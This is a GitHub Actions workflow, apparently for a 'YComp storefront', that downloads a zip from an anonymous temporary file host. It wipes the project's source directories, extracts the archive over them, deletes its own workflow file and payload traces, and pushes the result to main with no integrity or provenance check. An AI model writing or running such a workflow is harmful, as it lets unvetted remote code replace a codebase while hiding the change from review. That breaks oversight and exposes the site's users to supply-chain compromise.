name: Apply Codex Update

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/apply-codex-update.yml
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download source archive
        run: |
          curl -L --fail --retry 3 -o .codex-update.zip "https://tmpfiles.org/dl/1783434017.17901ef73f540adc/wkwEvjGlTcrd/ycomp-github-update.zip"
          python3 - <<'PY'
          import zipfile
          zipfile.ZipFile('.codex-update.zip').testzip()
          PY
      - name: Apply source archive
        run: |
          python3 - <<'PY'
          import pathlib
          import shutil
          import zipfile

          root = pathlib.Path('.')
          archive = root / '.codex-update.zip'
          if not archive.exists():
              raise SystemExit('Archive was not downloaded')

          for target in ['app', 'components', 'lib', 'prisma', 'public', 'scripts']:
              path = root / target
              if path.exists():
                  shutil.rmtree(path)

          with zipfile.ZipFile(archive) as zf:
              zf.extractall(root)

          archive.unlink(missing_ok=True)
          pathlib.Path('codex_update_manifest.txt').unlink(missing_ok=True)
          for part in root.glob('codex_update_payload.b64.*'):
              part.unlink(missing_ok=True)
          pathlib.Path('.github/workflows/apply-codex-update.yml').unlink(missing_ok=True)
          PY
      - name: Commit update
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config pull.rebase false
          git add -A
          if git diff --cached --quiet; then
            echo "No changes"
            exit 0
          fi
          git commit -m "Update YComp storefront build"
          git push
